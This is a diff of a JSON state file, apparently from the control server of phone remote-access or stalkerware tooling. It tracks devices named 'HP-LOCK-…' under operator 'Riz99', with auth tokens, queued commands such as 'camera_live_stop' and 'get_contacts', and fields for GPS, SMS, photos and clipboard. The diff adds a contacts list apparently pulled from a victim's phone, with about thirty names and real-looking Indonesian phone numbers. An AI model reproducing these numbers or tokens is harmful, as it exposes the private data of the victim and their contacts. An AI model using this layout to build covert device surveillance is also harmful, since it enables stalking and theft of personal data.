@@ -36,19 +36,8 @@
     "deviceName": "HP-LOCK-F00B",
     "ownerUsername": "Riz99",
     "token": "412790f5d70b3bfc34c744f279d7217a",
-    "lastSeen": 1775797215881,
-    "commandQueue": [
-      {
-        "type": "camera_live_stop",
-        "payload": {},
-        "sentAt": 1775797210292
-      },
-      {
-        "type": "get_contacts",
-        "payload": {},
-        "sentAt": 1775797216924
-      }
-    ],
+    "lastSeen": 1775797221609,
+    "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-10T04:51:00.301Z",
     "deviceInfo": {
@@ -65,7 +54,136 @@
     "smsMessages": [],
     "galleryPhotos": [],
     "galleryDone": true,
-    "contacts": [],
+    "contacts": [
+      {
+        "name": "+62601121996009",
+        "phone": "+62601121996009"
+      },
+      {
+        "name": "+626282250041650",
+        "phone": "+626282250041650"
+      },
+      {
+        "name": "+6282118603401",
+        "phone": "+6282118603401"
+      },
+      {
+        "name": "+6282164413424",
+        "phone": "+6282164413424"
+      },
+      {
+        "name": "+6282172730663",
+        "phone": "+6282172730663"
+      },
+      {
+        "name": "+62823136",
+        "phone": "+62823136"
+      },
+      {
+        "name": "+6282313696980",
+        "phone": "+6282313696980"
+      },
+      {
+        "name": "+6283142073418",
+        "phone": "+6283142073418"
+      },
+      {
+        "name": "+6283821402297",
+        "phone": "+6283821402297"
+      },
+      {
+        "name": "+62895326263056",
+        "phone": "+62895326263056"
+      },
+      {
+        "name": "Aida",
+        "phone": "+6281515620164"
+      },
+      {
+        "name": "Aida",
+        "phone": "+6285704935087"
+      },
+      {
+        "name": "Alpes",
+        "phone": "+62601121996009"
+      },
+      {
+        "name": "Alya",
+        "phone": "+6285857483243"
+      },
+      {
+        "name": "Customer Care DANA ✅",
+        "phone": "+622127937262"
+      },
+      {
+        "name": "Customer Care DANA ✅",
+        "phone": "+622150857500"
+      },
+      {
+        "name": "Customer Care DANA ✅",
+        "phone": "1500445"
+      },
+      {
+        "name": "Naji",
+        "phone": "+6282245000880"
+      },
+      {
+        "name": "Nayla",
+        "phone": "+6285155196839"
+      },
+      {
+        "name": "aal",
+        "phone": "+6285113148414"
+      },
+      {
+        "name": "alvin",
+        "phone": "+6285648446139"
+      },
+      {
+        "name": "ayahhh",
+        "phone": "+626282228888540"
+      },
+      {
+        "name": "bak ika",
+        "phone": "+6282228237048"
+      },
+      {
+        "name": "bug",
+        "phone": "+62831420718"
+      },
+      {
+        "name": "ebok wik",
+        "phone": "+6281230950074"
+      },
+      {
+        "name": "emba",
+        "phone": "+6282244864869"
+      },
+      {
+        "name": "jual beli",
+        "phone": "+6285809487078"
+      },
+      {
+        "name": "mama",
+        "phone": "+6282250041650"
+      },
+      {
+        "name": "satria bajak hitam🌊🌊",
+        "phone": "+6283876112094"
+      },
+      {
+        "name": "yonroblox gery",
+        "phone": "+6287797890532"
+      },
+      {
+        "name": "zaimmm",
+        "phone": "+6285785457946"
+      },
+      {
+        "name": "•|•Distzz",
+        "phone": "+628133358106"
+      }
+    ],
     "lastGps": null,
     "gpsList": [],
     "lastClipboard": null,
@@ -86,7 +204,7 @@
     "deviceName": "HP-LOCK-236E",
     "ownerUsername": "Riz99",
     "token": "6784c90883f6ca524a4b373f2457a114",
-    "lastSeen": 1775797216960,
+    "lastSeen": 1775797219962,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-10T04:58:07.933Z",
